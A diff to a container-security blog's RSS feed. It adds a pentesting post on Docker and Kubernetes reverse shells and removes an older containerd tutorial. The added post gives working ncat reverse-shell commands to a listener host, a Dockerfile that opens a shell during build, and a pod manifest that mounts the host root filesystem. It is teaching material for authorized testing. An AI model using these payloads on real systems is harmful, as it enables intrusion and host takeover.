@@ -7,6 +7,97 @@
 		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>Docker and Kubernetes Reverse shells</title>
+				<description>&lt;p&gt;A handy technique for any pentester is the ability to create a reverse shell. This allows for a variety of cases where you want to get access to restricted environments or want to extract information from a remote system.&lt;/p&gt;
+
+&lt;p&gt;There’s a number of scenarios where this can apply to containerized environments, here’s a couple with the steps that could be used to setup a reverse shell using &lt;a href=&quot;https://nmap.org/ncat/&quot;&gt;ncat&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;reverse-shell-from-docker-run&quot;&gt;Reverse shell from docker run&lt;/h2&gt;
+
+&lt;p&gt;Here we want to push a reverse shell back from a machine that we have &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; access to, this one is pretty simple&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
+We just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Target Machine&lt;/strong&gt;
+Here we just need a Docker image that has ncat available. I’ve got one &lt;a href=&quot;https://cloud.docker.com/u/raesene/repository/docker/raesene/ncat&quot;&gt;here&lt;/a&gt; on Docker hub.&lt;/p&gt;
+
+&lt;p&gt;So we just run this image with ncat parameters to connect back to the pentester machine on 192.168.200.1&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/ncat 192.168.200.1 8989 -e /bin/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;reverse-shell-from-a-dockerfile&quot;&gt;Reverse Shell from a Dockerfile&lt;/h2&gt;
+
+&lt;p&gt;So in our next scenario we’ve got the ability to get our Target Machine to do a &lt;code class=&quot;highlighter-rouge&quot;&gt;docker build&lt;/code&gt; on a &lt;code class=&quot;highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt; that we control.  This is common in places where there are CI/CD processes like Jenkins or Drone, or cloud container building services.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
+Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Target Machine&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Here we need to construct our Dockerfile to pass into the process, this one should work based on a base ubuntu:18.04 image&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04
+
+RUN apt update &amp;amp;&amp;amp; apt install -y nmap
+
+RUN ncat 192.168.200.1 8989 -e /bin/sh
+
+CMD [&quot;/bin/bash&quot;]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;when the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker build&lt;/code&gt; command is executed, the reverse shell will pop during the build process.&lt;/p&gt;
+
+&lt;h2 id=&quot;kubernetes-cluster&quot;&gt;Kubernetes Cluster&lt;/h2&gt;
+
+&lt;p&gt;So say you’ve got a Kubernetes cluster where you can create pods but otherwise your rights are limited, and you’d like to get a shell inside the cluster.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
+Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Target Cluster&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;So we just need a Pod manifest that will open a reverse shell on your pentester machine when created.  The example below will create that kind of pod and additionally will mount the hosts root filesystem into &lt;code class=&quot;highlighter-rouge&quot;&gt;/host&lt;/code&gt;, although this will fail if a restrictive &lt;code class=&quot;highlighter-rouge&quot;&gt;PodSecurityPolicy&lt;/code&gt; is in place.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
+kind: Pod
+metadata:
+  name: ncat-reverse-shell-pod
+  labels:
+    app: ncat
+spec:
+  containers:
+  - name: ncat-reverse-shell
+    image: raesene/ncat
+    volumeMounts:
+    - mountPath: /host
+      name: hostvolume
+    args: [&#39;192.168.200.1&#39;, &#39;8989&#39;, &#39;-e&#39;, &#39;/bin/bash&#39;]
+  volumes:
+  - name: hostvolume
+    hostPath:
+      path: /
+      type: Directory
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For extra credit you could mount in the Docker socket from the underlying host and then break out relatively easily&lt;/p&gt;
+</description>
+				<pubDate>Sat, 01 Jun 2019 10:10:39 +0100</pubDate>
+				<link>/blog/2019/06/01/docker-reverse-shells/</link>
+				<guid isPermaLink="true">/blog/2019/06/01/docker-reverse-shells/</guid>
+			</item>
+		
+			<item>
 				<title>Docker Capabilities and no-new-privileges</title>
 				<description>&lt;p&gt;I’ve been looking for a way to explain an demonstrate the “no-new-privileges” option in Docker for a little while for my &lt;a href=&quot;https://www.blackhat.com/us-19/training/schedule/#mastering-container-security-14020&quot;&gt;training course&lt;/a&gt; and recently came up with a way that should work, so thought it was worth a blog post.&lt;/p&gt;
 
@@ -56,6 +147,8 @@ CMD [&quot;/bin/bash&quot;]
 &lt;p&gt;when we run &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/setuidbash -p&lt;/code&gt; our escalation to root doesn’t work and our new bash shell stays running as the &lt;code class=&quot;highlighter-rouge&quot;&gt;newuser&lt;/code&gt; user, foiling our privilege escalation attempt :)&lt;/p&gt;
 
 &lt;p&gt;So, this option is one worth considering if you’ve got containers being launched as a non-root user and you want to reduce the risk of malicious processes in the container trying to get additional rights.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Edit&lt;/strong&gt; Just to add based on conversations on twitter following this post, it’s worth noting that you can achieve the same effect as &lt;code class=&quot;highlighter-rouge&quot;&gt;no-new-privileges&lt;/code&gt;, if you want to run your container as a non-root user, by doing &lt;code class=&quot;highlighter-rouge&quot;&gt;cap-drop=all&lt;/code&gt; as part of the run statement.  This has a similar effect in stopping the contained processes from gaining any Linux capabilities, and if your workloads support it, is a great idea for hardening your containers.&lt;/p&gt;
 </description>
 				<pubDate>Sat, 01 Jun 2019 10:10:39 +0100</pubDate>
 				<link>/blog/2019/06/01/docker-capabilities-and-no-new-privs/</link>
@@ -217,7 +310,7 @@ spec:
   &lt;li&gt;&lt;a href=&quot;http://docker.pwndland.uk/#/&quot;&gt;BSides London 2016 - Docker - Security Myths, Security Legends&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;version: '3'
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;version: &#39;3&#39;
 
 services:
   reverse-proxy:
@@ -257,7 +350,7 @@ services:
       - &quot;traefik.domain=`pwndland.uk`&quot;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
-				<pubDate>Mon, 25 Mar 2019 20:10:39 +0000</pubDate>
+				<pubDate>Mon, 25 Mar 2019 21:10:39 +0100</pubDate>
 				<link>/blog/2019/03/25/traefiking-in-presentations/</link>
 				<guid isPermaLink="true">/blog/2019/03/25/traefiking-in-presentations/</guid>
 			</item>
@@ -313,7 +406,7 @@ nodes:
 
 &lt;p&gt;I’ve started creating some sample configurations for some of the common insecure configurations you can see in Kubernetes clusters and putting them up on Github &lt;a href=&quot;https://github.com/raesene/kind-of-insecure&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
 </description>
-				<pubDate>Mon, 04 Mar 2019 20:10:39 +0000</pubDate>
+				<pubDate>Mon, 04 Mar 2019 21:10:39 +0100</pubDate>
 				<link>/blog/2019/03/04/kind-of-insecure-test-clusters/</link>
 				<guid isPermaLink="true">/blog/2019/03/04/kind-of-insecure-test-clusters/</guid>
 			</item>
@@ -349,7 +442,7 @@ nodes:
   &lt;/li&gt;
 &lt;/ul&gt;
 </description>
-				<pubDate>Sun, 11 Nov 2018 14:10:39 +0000</pubDate>
+				<pubDate>Sun, 11 Nov 2018 15:10:39 +0100</pubDate>
 				<link>/blog/2018/11/11/Docker-18-09-SSH/</link>
 				<guid isPermaLink="true">/blog/2018/11/11/Docker-18-09-SSH/</guid>
 			</item>
@@ -440,87 +533,6 @@ vulnerables/metasploit-vulnerability-emulator   9 months ago
 				<pubDate>Sun, 12 Aug 2018 12:10:39 +0100</pubDate>
 				<link>/blog/2018/08/12/Docker-Hub-Watch-Out-For-Old-Images/</link>
 				<guid isPermaLink="true">/blog/2018/08/12/Docker-Hub-Watch-Out-For-Old-Images/</guid>
-			</item>
-		
-			<item>
-				<title>Docker containers without Docker</title>
-				<description>&lt;p&gt;Following on from looking at &lt;a href=&quot;https://raesene.github.io/blog/2018/07/23/exploring-kata/&quot;&gt;katacontainers&lt;/a&gt; and &lt;a href=&quot;https://raesene.github.io/blog/2018/07/22/exploring-gvisor/&quot;&gt;gVisor&lt;/a&gt;, I thought it might be interesting to look at the &lt;a href=&quot;https://containerd.io/&quot;&gt;containerd&lt;/a&gt; project and the idea of using containerd and runc without docker to run containers.  Looking round the documentation, I couldn’t find a good look at getting containerd and runc setup together without installing Docker, so lets do that.&lt;/p&gt;
-
-&lt;h2 id=&quot;installation-notes&quot;&gt;Installation Notes&lt;/h2&gt;
-
-&lt;p&gt;For this install we’re working from a default Ubuntu 18.04 server install.&lt;/p&gt;
-
-&lt;h3 id=&quot;step-one---get-containerd&quot;&gt;Step one - Get Containerd&lt;/h3&gt;
-&lt;p&gt;First step is to get the containerd binaries, they’re available on the release page of the containerd github site &lt;a href=&quot;https://github.com/containerd/containerd/releases&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wget https://github.com/containerd/containerd/releases/download/v1.1.2/containerd-1.1.2.linux-amd64.tar.gz&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tar -xzvf containerd-1.1.2.linux-amd64.tar.gz&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo cp bin/* /usr/local/bin/&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;This should place the binaries in a location on the path.  In addition to the daemon files there’s a copy of the &lt;code class=&quot;highlighter-rouge&quot;&gt;ctr&lt;/code&gt; binary which is used as a client.&lt;/p&gt;
-
-&lt;h3 id=&quot;step-two---get-runc&quot;&gt;Step two - Get runc&lt;/h3&gt;
-
-&lt;p&gt;We can get the runc binary from their Github page &lt;a href=&quot;https://github.com/opencontainers/runc/releases&quot;&gt;here&lt;/a&gt;.  We’ll get the AMD64 binary and put it in the same dir as the containerd files&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wget https://github.com/opencontainers/runc/releases/download/v1.0.0-rc5/runc.amd64&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo cp runc.amd64 /usr/local/bin/runc&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo chmod +x /usr/local/bin/runc&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;step-three---containerd-configuration&quot;&gt;Step three - Containerd configuration&lt;/h3&gt;
-
-&lt;p&gt;Now we’ll need to provide containerd some configuration and setup the systemd entry so that we can start it automatically on boot.  Containerd has a handy command for generating a default configuration , so we can use that.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;containerd config default &amp;gt; config.toml&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo mkdir /etc/containerd&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo cp config.toml /etc/containerd/&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Next up, setting up systemd.  The containerd project provides a systemd unit file on their github repo. so we can get that and use it.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wget https://raw.githubusercontent.com/containerd/containerd/master/containerd.service&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo cp containerd.service /etc/systemd/system&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo systemctl daemon-reload&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo systemctl start containerd&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;If you want containerd to start on boot you can also add&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo systemctl enable containerd&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;running-containers-with-containerd&quot;&gt;Running containers with Containerd&lt;/h2&gt;
-
-&lt;p&gt;If all has gone well we should now have a running containerd/runc setup, so next up is getting and running a container.  This is a little more involved than the easy Docker process, and there’s a couple of different command to know, but nothing too heavy.&lt;/p&gt;
-
-&lt;p&gt;First up we can check that the client can connect to the daemon ok with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo ctr version&lt;/code&gt; .  If this works, you should see something like&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Client:
-  Version:  v1.1.2
-  Revision: 468a545b9edcd5932818eb9de8e72413e616e86e
-
-Server:
-  Version:  v1.1.2
-  Revision: 468a545b9edcd5932818eb9de8e72413e616e86e
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Pulling an image is done with &lt;code class=&quot;highlighter-rouge&quot;&gt;ctr image pull&lt;/code&gt;.  An important note is that unlike Docker this doesn’t hard code a default registry, so you need to specify the Docker hub URL if you’re pulling from there. &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo ctr image pull registry.hub.docker.com/library/alpine:3.7&lt;/code&gt; should download an Alpine 3.7 image.&lt;/p&gt;
-
-&lt;p&gt;Next up we need to create a container.  This is done with &lt;code class=&quot;highlighter-rouge&quot;&gt;ctr container create&lt;/code&gt; and you just pass the image and a name so something like &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo ctr container create -t registry.hub.docker.com/library/alpine:3.7 myfirstcontainer&lt;/code&gt; should work. One point to note is that we’re passing the &lt;code class=&quot;highlighter-rouge&quot;&gt;-t&lt;/code&gt; switch here to provide a TTY to the container&lt;/p&gt;
-
-&lt;p&gt;Now at this point you might be wondering “hey why am I not in my container?”.  In containerd land you need to start the task after creating the container, so &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo ctr task start myfirstcontainer&lt;/code&gt; should work and put you in your container.&lt;/p&gt;
-
-&lt;p&gt;Looking around you’ll notice that whilst most things are similar to where you were running with docker, there are some differences, notably that you’ve got no networking past the &lt;code class=&quot;highlighter-rouge&quot;&gt;lo&lt;/code&gt; interface. That’s provided by Docker.  You can work round this using &lt;code class=&quot;highlighter-rouge&quot;&gt;--net-host&lt;/code&gt; on the container create statement to get access to the host’s network, but that’s a little hacky. Past that it should be possible to hook up other container networking solutions to this, but that’s a topic for another blog post!&lt;/p&gt;
-</description>
-				<pubDate>Sun, 05 Aug 2018 12:10:39 +0100</pubDate>
-				<link>/blog/2018/08/05/Docker-Containers-Without-Docker/</link>
-				<guid isPermaLink="true">/blog/2018/08/05/Docker-Containers-Without-Docker/</guid>
 			</item>
 		
 	</channel>
